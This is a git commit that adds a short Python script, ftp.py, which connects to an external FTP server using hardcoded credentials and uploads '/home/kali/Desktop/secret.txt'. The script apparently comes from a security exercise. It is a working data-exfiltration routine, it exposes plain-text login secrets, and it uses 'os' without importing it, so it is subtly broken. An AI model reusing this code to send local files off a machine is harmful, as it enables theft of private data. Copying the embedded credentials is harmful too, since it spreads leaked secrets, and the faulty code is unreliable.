8ddaad6e43492a15884f6786403d9d890d5fe45e
ROBIND KUMAR <kumarrobind386@gmail.com>
2025-10-31 11:07:03 +0530

    Included the file

---
+++ ftp.py
@@ -0,0 +1,21 @@
+import ftplib
+
+# Set the FTP server address and credentials
+ftp_server = 'eu-central-1.sftpcloud.io'
+ftp_username = '09021bbea77c41cba30b335dedd4e2cb'
+ftp_password = 'nM0CfvfJ4VY6kJMnNmUuWhCrnamUAbYo'
+ftp_port = 21
+file_path_to_send = '/home/kali/Desktop/secret.txt'
+
+# Connect to the FTP server
+ftp = ftplib.FTP(ftp_server, ftp_username, ftp_password, ftp_port)
+
+# Change to the desired directory
+ftp.cwd('/')
+
+# Transfer the file
+with open(file_path_to_send, 'rb') as file:
+    ftp.storbinary(f'STOR {os.path.basename(file_path_to_send)}', file)
+
+# Close the FTP connection
+ftp.quit()
